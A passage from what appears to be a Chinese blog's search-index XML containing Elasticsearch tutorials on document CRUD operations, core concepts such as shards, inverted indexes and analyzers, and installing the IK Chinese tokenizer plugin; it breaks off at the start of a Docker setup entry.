class="comment">#查看</span></span><br></pre></td></tr></table></figure><p><code>思考</code>：<strong>POST和PUT的区别</strong></p><p>1）在ES中,如果不确定文档的ID，那么就需要用POST，它可以自己生成唯一的文档ID。如果确定文档的ID，那么就可以用PUT，当然也可以用POST，它们都可以创建或修改文档（如果是修改，那么_version版本号提高1）</p><p>2）PUT、GET、DELETE是幂等的，而POST并不一定是幂等。如果你对POST也指定了文档ID,那它其实和PUT没啥区别，那它就是幂等。如果你没有指定文档ID那么就不是幂等操作了，因为同一数据，你执行多次POST，那么生成多个UUID的文档，</p><p>也就是每POST一次都会新增一条数据。</p><h4 id="3-1、创建文档"><a href="#3-1、创建文档" class="headerlink" title="3.1、创建文档"></a>3.1、创建文档</h4><p><strong>1）PUT方式创建</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT  /student/_doc/1 </span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"徐小小"</span>,</span><br><span class="line">    <span class="attr">"country"</span>: <span class="string">"杭州"</span>,</span><br><span class="line">    <span class="attr">"age"</span>: <span class="string">"3"</span>,</span><br><span class="line">    <span class="attr">"date"</span>: <span class="string">"2019-09-04"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es2-1.png" alt="es"> </p><p><strong>2）POST方式创建</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST不指定主键</span><br><span class="line">POST  &#x2F;student&#x2F;_doc</span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;徐小小&quot;,</span><br><span class="line">    &quot;country&quot;: &quot;杭州&quot;,</span><br><span class="line">    &quot;age&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;date&quot;: &quot;2019-09-04&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es2-2.png" alt="es"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST指定主键ID</span><br><span class="line">POST  &#x2F;student&#x2F;_doc&#x2F;88</span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;徐小小&quot;,</span><br><span class="line">    &quot;country&quot;: &quot;杭州&quot;,</span><br><span class="line">    &quot;age&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;date&quot;: &quot;2019-09-04&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es2-3.png" alt="es"> </p><p>可以明显看出，POST也可以指定文档ID,如果指定文档ID,那么就和PUT没有区别。ID不存在则创建，存在则更新并且<code>_version</code>版本+1.</p><h4 id="3-2、文档查看"><a href="#3-2、文档查看" class="headerlink" title="3.2、文档查看"></a>3.2、文档查看</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET  /student/_doc/1</span><br></pre></td></tr></table></figure><p>如图</p><p><img src="/img/es/es2-4.png" alt="es"> </p><h4 id="3-3、文档更新"><a href="#3-3、文档更新" class="headerlink" title="3.3、文档更新"></a>3.3、文档更新</h4><p>商品PUT和POST执行的时候，如果指定的文档ID存在，那么就可以执行更新操作。不过它们执行的是全量更新，如果需要单独对某字段更新我们可以使用关键字<code>_update</code></p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;student&#x2F;_update&#x2F;1</span><br><span class="line">&#123;</span><br><span class="line">   &quot;doc&quot; : &#123;</span><br><span class="line">      &quot;age&quot;: 5</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST /student/_update/1 {   “doc” : {      “age”: 5   } }</p><p><img src="/img/es/es2-5.png" alt="es"> </p><h4 id="4、文档删除"><a href="#4、文档删除" class="headerlink" title="4、文档删除"></a>4、文档删除</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE &#x2F;&#123;index&#125;&#x2F;&#123;type&#125;&#x2F;&#123;id&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch——基本概念</title>
      <link href="/2023/07/22/Elasticsearch%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/07/22/Elasticsearch%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文包含的基本概念包含:Index、Type、Document。集群，节点，分片及副本，倒排索引，分词器。</p><h2 id="1-Index-Type-Document"><a href="#1-Index-Type-Document" class="headerlink" title="1.Index,Type,Document"></a>1.Index,Type,Document</h2><h3 id="1-1-Index"><a href="#1-1-Index" class="headerlink" title="1.1 Index"></a>1.1 Index</h3><p><code>index</code>：索引是文档(Document)的容器，是一类文档的集合。</p><p><strong>索引</strong>这个词在 ElasticSearch 会有三种意思:</p><p><strong>1)、索引(名词)</strong></p><p>类比传统的关系型数据库领域来说，<code>索引相当于SQL中的一个数据库(Database)</code>。索引由其名称(<strong>必须为全小写字符</strong>)进行标识。</p><p><strong>2)、索引(动词)</strong></p><p><code>保存一个文档到索引(名词)的过程</code>。这非常类似于SQL语句中的 INSERT关键词。如果该文档已存在时那就相当于数据库的UPDATE。</p><p><strong>3)、倒排索引</strong></p><p>关系型数据库通过增加一个<strong>B+树索</strong>引到指定的列上，以便提升数据检索速度。索引ElasticSearch 使用了一个叫做 <code>倒排索引</code> 的结构来达到相同的目的。</p><h3 id="1-2-Type"><a href="#1-2-Type" class="headerlink" title="1.2 Type"></a>1.2 Type</h3><p><code>Type</code> 可以理解成关系数据库中Table。</p><p>之前的版本中，索引和文档中间还有个类型的概念，每个索引下可以建立多个类型，文档存储时需要指定index和type。从6.0.0开始单个索引中只能有一个类型，</p><p>7.0.0以后将将不建议使用，8.0.0 以后完全不支持。</p><h5 id="弃用该概念的原因："><a href="#弃用该概念的原因：" class="headerlink" title="弃用该概念的原因："></a>弃用该概念的原因：</h5><p>我们虽然可以通俗的去理解Index比作 SQL 的 Database，Type比作SQL的Table。但这并不准确，因为如果在SQL中,Table 之前相互独立，同名的字段在两个表中毫无关系。</p><p>但是在ES中，同一个Index 下不同的 Type 如果有同名的字段，他们会被 Luecence 当作同一个字段 ，并且他们的定义必须相同。所以我觉得Index现在更像一个表，</p><p>而Type字段并没有多少意义。目前Type已经被Deprecated，在7.0开始，一个索引只能建一个Type为<code>_doc</code></p><h3 id="1-3-Document"><a href="#1-3-Document" class="headerlink" title="1.3 Document"></a>1.3 Document</h3><p><code>Document</code> Index 里面单条的记录称为Document（文档）。<strong>等同于关系型数据库表中的行</strong>。</p><p>我们来看下一个文档的源数据</p><p><img src="/img/es/es1-0.png" alt="es1"> </p><p><code>_index</code> 文档所属索引名称。</p><p><code>_type</code> 文档所属类型名。</p><p><code>_id</code> Doc的主键。在写入的时候，可以指定该Doc的ID值，如果不指定，则系统自动生成一个唯一的UUID值。</p><p><code>_version</code> 文档的版本信息。Elasticsearch通过使用version来保证对文档的变更能以正确的顺序执行，避免乱序造成的数据丢失。</p><p><code>_seq_no</code> 严格递增的顺序号，每个文档一个，Shard级别严格递增，保证后写入的Doc的<code>_seq_no</code>大于先写入的Doc的_seq_no。</p><p><code>primary_term</code> primary_term也和<code>_seq_no</code>一样是一个整数，每当Primary Shard发生重新分配时，比如重启，Primary选举等，_primary_term会递增1</p><p><code>found</code> 查询的ID正确那么ture, 如果 Id 不正确，就查不到数据，found字段就是false。</p><p><code>_source</code> 文档的原始JSON数据。</p><h2 id="二、集群，节点，分片及副本"><a href="#二、集群，节点，分片及副本" class="headerlink" title="二、集群，节点，分片及副本"></a>二、集群，节点，分片及副本</h2><h4 id="2-1、集群"><a href="#2-1、集群" class="headerlink" title="2.1、集群"></a>2.1、集群</h4><p>ElasticSearch集群实际上是一个分布式系统，它需要具备两个特性：</p><p>　　1）<code>高可用性</code></p><p>　　　　a）服务可用性：允许有节点停止服务；</p><p>　　　　b）数据可用性：部分节点丢失，不会丢失数据；</p><p>　　2）<code>可扩展性</code></p><p>　　　　随着请求量的不断提升，数据量的不断增长，系统可以将数据分布到其他节点，实现水平扩展；</p><p><strong>一个集群中可以有一个或者多个节点</strong>；</p><p><strong>集群健康值</strong></p><ol><li><code>green</code>：所有主要分片和复制分片都可用</li><li><code>yellow</code>：所有主要分片可用，但不是所有复制分片都可用</li><li><code>red</code>：不是所有的主要分片都可用</li></ol><p>当集群状态为 red，它仍然正常提供服务，它会在现有存活分片中执行请求，我们需要尽快修复故障分片，防止查询数据的丢失；</p><h4 id="2-2、节点-Node"><a href="#2-2、节点-Node" class="headerlink" title="2.2、节点(Node)"></a>2.2、节点(Node)</h4><p>　1）<strong>节点是什么？</strong></p><p>　　　　a）节点是一个ElasticSearch的实例，其本质就是一个Java进程；</p><p>　　　　b）一台机器上可以运行多个ElasticSearch实例，但是建议在生产环境中一台机器上只运行一个ElasticSearch实例；</p><p>Node 是组成集群的一个单独的服务器，用于存储数据并提供集群的搜索和索引功能。与集群一样，节点也有一个唯一名字，默认在节点启动时会生成一个uuid作为节点名，</p><p>该名字也可以手动指定。单个集群可以由任意数量的节点组成。如果只启动了一个节点，则会形成一个单节点的集群。</p><h4 id="2、节点-Node"><a href="#2、节点-Node" class="headerlink" title="2、节点(Node)"></a>2、节点(Node)</h4><p>　1）<strong>节点是什么？</strong></p><p>　　　　a）节点是一个ElasticSearch的实例，其本质就是一个Java进程；</p><p>　　　　b）一台机器上可以运行多个ElasticSearch实例，但是建议在生产环境中一台机器上只运行一个ElasticSearch实例；</p><p>Node 是组成集群的一个单独的服务器，用于存储数据并提供集群的搜索和索引功能。与集群一样，节点也有一个唯一名字，默认在节点启动时会生成一个uuid作为节点名，</p><p>该名字也可以手动指定。单个集群可以由任意数量的节点组成。如果只启动了一个节点，则会形成一个单节点的集群。</p><h4 id="2-3、分片"><a href="#2-3、分片" class="headerlink" title="2.3、分片"></a>2.3、分片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Primary Shard(主分片）</span><br></pre></td></tr></table></figure><p>ES中的shard用来解决节点的容量上限问题,，通过主分片，可以将数据分布到集群内的所有节点之上。</p><p>它们之间关系</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一个节点对应一个ES实例；</span><br><span class="line">一个节点可以有多个<span class="keyword">index</span>（索引）;</span><br><span class="line">一个<span class="keyword">index</span>可以有多个shard（分片）；</span><br><span class="line">　一个分片是一个lucene <span class="keyword">index</span>（此处的<span class="keyword">index</span>是lucene自己的概念，与ES的<span class="keyword">index</span>不是一回事）；</span><br><span class="line">主分片数是在索引创建时指定，后续不允许修改，除非Reindex</span><br></pre></td></tr></table></figure><p>一个索引中的数据保存在多个分片中(默认为一个)，相当于水平分表。一个分片便是一个Lucene 的实例，它本身就是一个完整的搜索引擎。我们的文档被存储和索引到分片内，</p><p>但是应用程序是直接与索引而不是与分片进行交互。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Replica Shard（副本）</span><br></pre></td></tr></table></figure><p>副本有两个重要作用：</p><p>1、<strong>服务高可用</strong>：由于数据只有一份,如果一个node挂了,那存在上面的数据就都丢了,有了replicas,只要不是存储这条数据的node全挂了,数据就不会丢。因此分片副本不会与</p><p>主分片分配到同一个节点；</p><p>2、<strong>扩展性能</strong>：通过在所有replicas上并行搜索提高搜索性能.由于replicas上的数据是近实时的(near realtime),因此所有replicas都能提供搜索功能,通过设置合理的replicas</p><p>数量可以极高的提高搜索吞吐量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分片的设定</span><br></pre></td></tr></table></figure><p>　　对于生产环境中分片的设定，需要提前做好容量规划，因为主分片数是在索引创建时预先设定的，后续无法修改。</p><p><strong>分片数设置过小</strong></p><p>　　　　　　导致后续无法增加节点进行水平扩展。</p><p>　　　　　　导致分片的数据量太大，数据在重新分配时耗时；</p><p><strong>分片数设置过大</strong></p><p>　　　　　　影响搜索结果的相关性打分，影响统计结果的准确性；</p><p>　　　　　　单个节点上过多的分片，会导致资源浪费，同时也会影响性能；</p><h3 id="3-倒排索引"><a href="#3-倒排索引" class="headerlink" title="3.倒排索引"></a>3.倒排索引</h3><p>ES的搜索功能是基于lucene,而lucene搜索的基本原理就是倒叙索引,<code>倒序排序的结果跟分词的类型有关</code>。</p><p>举例</p><p>1、假设文档集合包含五个文档，毎个文档内容如图所示，在图中最左端一栏是每个文档对应的文挡编号。</p><p><img src="/img/es/es1-1.png" alt="es1"> </p><p>2、首先要用分词系统将文挡自动切分成单词序列，记录下哪些文挡包含这个单词，在如此处理结束后，我们可以得到最简单的倒排索引。</p><p><img src="/img/es/es1-2.png" alt="es1"> </p><p>3、索引系统还可以记录除此之外的更多信息，下图还记载了单词频率信息。文档中的句子被划分为一个个term(term 用来表示一个单词或词语,<code>取决于使用的分词方式</code>),</p><p><code>倒叙索引</code>中存储着term,term的出现频率(tf,term frequency)和出现位置(<code>倒叙索引中的单词是按顺序排列的,这张图没有体现出来</code>),请注意这里的文档内容是document</p><p>中的一个字段,也就是说每个被索引了的字段都有自己的倒叙索引</p><p><img src="/img/es/es1-2.png" alt="es1"> </p><p><strong>一次简单的搜索流程</strong></p><p>假设我们搜索<code>谷歌地图之父</code>,搜索流程会是这样</p><ol><li>分词,分词插件将句子分为3个term <code>谷歌</code>,<code>地图</code>,<code>之父</code></li><li>将这3个term拿到倒叙索引中去查找(会很高效,比如二分查找),如果匹配到了就拿对应的文档id,获得文档内容</li></ol><p><strong>但是,如何确定结果顺序?</strong></p><p>这里要引入_score的概念,对于term的匹配,lucene会对其打分,得分越高,排名越靠前.这里要介绍几个相关的概念</p><p>- TF(term frequency),词频,term在当前document中出现的频率,一个term在当前document中出现5次要比出现1次更相关,打分也会更高 - IDF(inverse doucment frequency),逆向文档频率,term在所有document中出现的频率,这个频率越高,该term对应的分值越低 - 字段长度归一值,简单来说就是字段越短,字段的权重越高, 比如 term <code>我</code>在匹配 <code>我123</code>和<code>我123456</code>时,<code>我123</code>的得分会更高.</p><h3 id="4-分词器"><a href="#4-分词器" class="headerlink" title="4.分词器"></a>4.分词器</h3><h4 id="4-1分词器概念"><a href="#4-1分词器概念" class="headerlink" title="4.1分词器概念"></a>4.1分词器概念</h4><h5 id="4-1-1、Analysis-和-Analyzer"><a href="#4-1-1、Analysis-和-Analyzer" class="headerlink" title="4.1.1、Analysis 和 Analyzer"></a>4.1.1、Analysis 和 Analyzer</h5><p><code>Analysis</code>： 文本分析是把全文本转换一系列单词(term/token)的过程，也叫分词。<strong>Analysis是通过Analyzer来实现的</strong>。</p><p>当一个文档被索引时，每个Field都可能会创建一个倒排索引（Mapping可以设置不索引该Field）。</p><p><strong>倒排索引的过程就是将文档通过Analyzer分成一个一个的Term,每一个Term都指向包含这个Term的文档集合。</strong></p><p>当查询query时，Elasticsearch会根据搜索类型决定是否对query进行analyze，然后和倒排索引中的term进行相关性查询，匹配相应的文档。</p><h5 id="4-1-2-、Analyzer组成"><a href="#4-1-2-、Analyzer组成" class="headerlink" title="4.1.2 、Analyzer组成"></a>4.1.2 、Analyzer组成</h5><p>分析器（analyzer）都由三种构件块组成的：<code>character filters</code> ， <code>tokenizers</code> ， <code>token filters</code>。</p><p>1) character filter 字符过滤器</p><p><strong>* 在一段文本进行分词之前，先进行预处理，比如说最常见的就是，过滤html标签（<span>hello<span> —&gt; hello），&amp; —&gt; and（I&amp;you —&gt; I and you </strong></p><p>2) tokenizers 分词器</p><p>英文分词可以根据空格将单词分开,中文分词比较复杂,可以采用机器学习算法来分词。</p><p>3) Token filters Token过滤器</p><p><strong>将切分的单词进行加工</strong>。大小写转换（例将“Quick”转为小写），去掉词（例如停用词像“a”、“and”、“the”等等），或者增加词（例如同义词像“jump”和“leap”）。</p><p><code>三者顺序</code>：<strong>Character Filters—-&gt;Tokenizer—-&gt;Token Filter</strong></p><p><code>三者个数</code>：<strong>analyzer = CharFilters（0个或多个） + Tokenizer(恰好一个) + TokenFilters(0个或多个)</strong></p><h5 id="4-1-3、Elasticsearch的内置分词器"><a href="#4-1-3、Elasticsearch的内置分词器" class="headerlink" title="4.1.3、Elasticsearch的内置分词器"></a>4.1.3、Elasticsearch的内置分词器</h5><ul><li>Standard Analyzer - 默认分词器，按词切分，小写处理</li><li>Simple Analyzer - 按照非字母切分(符号被过滤), 小写处理</li><li>Stop Analyzer - 小写处理，停用词过滤(the,a,is)</li><li>Whitespace Analyzer - 按照空格切分，不转小写</li><li>Keyword Analyzer - 不分词，直接将输入当作输出</li><li>Patter Analyzer - 正则表达式，默认\W+(非字符分割)</li><li>Language - 提供了30多种常见语言的分词器</li><li>Customer Analyzer 自定义分词器</li></ul><h5 id="4-1-4、创建索引时设置分词器"><a href="#4-1-4、创建索引时设置分词器" class="headerlink" title="4.1.4、创建索引时设置分词器"></a>4.1.4、创建索引时设置分词器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PUT new_index</span><br><span class="line">&#123;</span><br><span class="line">&quot;settings&quot;: &#123;</span><br><span class="line">&quot;analysis&quot;: &#123;</span><br><span class="line">&quot;analyzer&quot;: &#123;</span><br><span class="line">&quot;std_folded&quot;: &#123;</span><br><span class="line">&quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">&quot;tokenizer&quot;: &quot;standard&quot;,</span><br><span class="line">&quot;filter&quot;: [</span><br><span class="line">&quot;lowercase&quot;,</span><br><span class="line">&quot;asciifolding&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;mappings&quot;: &#123;</span><br><span class="line">&quot;properties&quot;: &#123;</span><br><span class="line">&quot;title&quot;: &#123;</span><br><span class="line">&quot;type&quot;: &quot;text&quot;,</span><br><span class="line">&quot;analyzer&quot;: &quot;std_folded&quot; #指定分词器</span><br><span class="line">&#125;,</span><br><span class="line">&quot;content&quot;: &#123;</span><br><span class="line">&quot;type&quot;: &quot;text&quot;,</span><br><span class="line">&quot;analyzer&quot;: &quot;whitespace&quot; #指定分词器</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-ES内置分词器"><a href="#4-2-ES内置分词器" class="headerlink" title="4.2 ES内置分词器"></a>4.2 ES内置分词器</h4><p>这里讲解下常见的几个分词器：<code>Standard Analyzer</code>、<code>Simple Analyzer</code>、<code>whitespace Analyzer</code>。</p><h5 id="4-2-1、Standard-Analyzer-默认"><a href="#4-2-1、Standard-Analyzer-默认" class="headerlink" title="4.2.1、Standard Analyzer(默认)"></a>4.2.1、Standard Analyzer(默认)</h5><p><strong>1）示例</strong></p><p>standard 是默认的分析器。它提供了基于语法的标记化（基于Unicode文本分割算法），适用于大多数语言</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;standard&quot;,</span><br><span class="line">  &quot;text&quot;:     &quot;Like X 国庆放假的&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es1-3.png" alt="es1"> </p><p><strong>2）配置</strong></p><p>标准分析器接受下列参数：</p><ul><li>max_token_length ： 最大token长度，默认255</li><li>stopwords ： 预定义的停止词列表，如<code>_english_</code>或 包含停止词列表的数组，默认是 <code>_none_</code></li><li>stopwords_path ： 包含停止词的文件路径</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT new_index</span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;analysis&quot;: &#123;</span><br><span class="line">      &quot;analyzer&quot;: &#123;</span><br><span class="line">        &quot;my_english_analyzer&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;standard&quot;,       #设置分词器为standard</span><br><span class="line">          &quot;max_token_length&quot;: 5,    #设置分词最大为5</span><br><span class="line">          &quot;stopwords&quot;: &quot;_english_&quot;  #设置过滤词</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-2-2-Simple-Analyzer"><a href="#4-2-2-Simple-Analyzer" class="headerlink" title="4.2.2 Simple Analyzer"></a>4.2.2 Simple Analyzer</h5><p>simple 分析器当它遇到<strong>只要不是字母的字符</strong>，就将文本解析成term，而且所有的term都是小写的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;simple&quot;,</span><br><span class="line">  &quot;text&quot;:     &quot;Like X 国庆放假 的&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es1-4.png" alt="es1"> </p><h5 id="4-2-3、Whitespace-Analyzer"><a href="#4-2-3、Whitespace-Analyzer" class="headerlink" title="4.2.3、Whitespace Analyzer"></a>4.2.3、Whitespace Analyzer</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;whitespace&quot;,</span><br><span class="line">  &quot;text&quot;:     &quot;Like X 国庆放假 的&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es1-5.png" alt="es1"> </p><h4 id="4-3中文分词器"><a href="#4-3中文分词器" class="headerlink" title="4.3中文分词器"></a>4.3中文分词器</h4><p>中文的分词器现在大家比较推荐的就是 <code>IK分词器</code>，当然也有些其它的比如 <strong>smartCN</strong>、<strong>HanLP</strong>。</p><p>这里只讲如何使用IK做为中文分词。</p><h4 id="1、IK分词器安装"><a href="#1、IK分词器安装" class="headerlink" title="1、IK分词器安装"></a>1、IK分词器安装</h4><p>开源分词器 Ik 的github：<a href="https://github.com/medcl/elasticsearch-analysis-ik" target="_blank" rel="noopener">https://github.com/medcl/elasticsearch-analysis-ik</a></p><p><code>注意</code> IK分词器的版本要你安装ES的版本一致，我这边是7.1.0那么就在github找到对应版本，然后启动命令··</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;bin&#x2F;elasticsearch-plugin install https:&#x2F;&#x2F;github.com&#x2F;medcl&#x2F;elasticsearch-analysis-ik&#x2F;releases&#x2F;download&#x2F;v7.1.0&#x2F;elasticsearch-analysis-ik-7.1.0.zip</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es1-6.png" alt="es1"> </p><p><code>注意</code> 安装完插件后需重启Es，才能生效。</p><h4 id="2、IK使用"><a href="#2、IK使用" class="headerlink" title="2、IK使用"></a>2、IK使用</h4><p>IK有两种颗粒度的拆分：</p><p><code>ik_smart</code>: 会做最粗粒度的拆分</p><p><code>ik_max_word</code>: 会将文本做最细粒度的拆分</p><p><strong>1) ik_smart 拆分</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;text&quot;:&quot;中华人民共和国国徽&quot;,</span><br><span class="line">  &quot;analyzer&quot;:&quot;ik_smart&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es1-7.png" alt="es1"> </p><p><strong>2）ik_max_word 拆分</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /_analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"text"</span>:<span class="string">"中华人民共和国国徽"</span>,</span><br><span class="line">  <span class="string">"analyzer"</span>:<span class="string">"ik_max_word"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es1-8.png" alt="es1"> </p>]]></content>
      
      
      <categories>
          
          <category> Elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch——Docker容器中运行ES,Kibana,Cerebro</title>
      <link href="/2023/06/16/Elasticsearch%E2%80%94%E2%80%94Docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%BF%90%E8%A1%8CES-Kibana-Cerebro/"/>
      <url>/2023/06/16/Elasticsearch%E2%80%94%E2%80%94Docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%BF%90%E8%A1%8CES-Kibana-Cerebro/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker容器中运行ES-Kibana-Cerebro"><a href="#Docker容器中运行ES-Kibana-Cerebro" class="headerlink" title="Docker容器中运行ES,Kibana,Cerebro"></a>Docker容器中运行ES,Kibana,Cerebro</h2><h3 id="1-所需环境以及配置文件"><a href="#1-所需环境以及配置文件" class="headerlink" title="1.所需环境以及配置文件"></a>1.所需环境以及配置文件</h3><p>环境：<code>Docker</code></p><p>配置文件:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td 